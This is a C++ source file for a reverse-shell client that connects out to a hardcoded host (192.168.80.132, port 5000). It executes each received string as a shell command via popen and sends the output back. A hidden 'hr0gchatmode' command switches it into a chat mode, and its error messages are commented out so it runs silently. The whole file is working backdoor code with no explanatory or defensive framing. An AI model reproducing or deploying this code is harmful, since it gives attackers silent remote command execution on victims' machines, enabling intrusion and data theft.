#include <iostream>
#include <string>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <thread>
#include <mutex>
#include <fcntl.h>
#include <sys/select.h>
#include <netinet/tcp.h>
#include <array>

std::mutex coutMutex;
bool chatmode = false;
std::thread sender;

void setSocketNonBlocking(int sock) {
    int flags = fcntl(sock, F_GETFL, 0);
    if (flags < 0) return;
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

void sendMessage(int sock) {
    std::string message;
    while (true) {
        std::cout << "Enter message: ";
        std::getline(std::cin, message);

        if (send(sock, message.c_str(), message.length(), 0) < 0) {
            //std::cerr << "Send failed: " << strerror(errno) << std::endl;
        }
    }
}

/*
void displayReceivedMessage(const std::string& message) {
    std::lock_guard<std::mutex> lock(coutMutex);
    // Move up one line, clear line, and reset cursor position to start of line
    std::cout << "\033[A\033[2K\r";
    std::cout << "Received: " << message << "\n" << std::flush;
}*/

void receiveMessage(int sock) {
    fd_set readfds;
    struct timeval tv;
    int retval;
    char buffer[1024];

    // Set up timeout
    tv.tv_sec = 5;
    tv.tv_usec = 0;

    while (true) {
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);

        retval = select(sock + 1, &readfds, NULL, NULL, &tv);

        if (retval == -1) {
            perror("select()");
            break;
        }
        else if (retval) {
            memset(buffer, 0, sizeof(buffer));
            int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
            if (bytesReceived > 0) {
                std::string receivedCmd(buffer, bytesReceived);
                if (receivedCmd == "hr0gchatmode")
                {
                    sender = std::thread(sendMessage, sock);
                    sender.join();
                    chatmode = true;
                }
                if (receivedCmd == "bye")
                {
                    sender.detach();
                    chatmode = false;
                }

                if (!chatmode)
                {
                    const char* redirect = " 2>&1";
                    strcat(buffer, redirect);

                    std::array<char, 256> rbuffer;
                    std::string result, cmd(buffer);
                    FILE* pipe = popen(cmd.substr(4).c_str(), "r"); // Use "popen" on Linux

                    // Read the output a line at a time until the end is reached.
                    while (fgets(rbuffer.data(), rbuffer.size(), pipe) != nullptr) {
                        result += rbuffer.data();
                    }

                    // Close the pipe
                    auto returnCode = pclose(pipe);

                    //std::cout << result;
                    result = "\n" + result;
                    if (send(sock, result.c_str(), result.length(), 0) < 0) {
                        //std::cerr << "Send failed: " << strerror(errno) << std::endl;
                    }
                }
            }
            else {
                //std::cout << "Server closed connection or receive error\n";
                break;
            }
        }
    }
}

int main() {
    int sock;
    struct sockaddr_in server;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock == -1) {
        //std::cerr << "Could not create socket\n";
        return 1;
    }

    // Set TCP_NODELAY to disable Nagle's algorithm and send data immediately
    int flag = 1;
    int result = setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(int));
    if (result < 0) {
        //std::cerr << "Error setting TCP_NODELAY\n";
        return 1;
    }

    server.sin_addr.s_addr = inet_addr("192.168.80.132");
    server.sin_family = AF_INET;
    server.sin_port = htons(5000);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        //perror("connect failed. Error");
        return 1;
    }

    setSocketNonBlocking(sock);  // Set the socket to non-blocking

    //std::cout << "Connected to the server.\n";

    //std::thread sender(sendMessage, sock);
    std::thread receiver(receiveMessage, sock);

    receiver.join();

    close(sock);
    return 0;
}
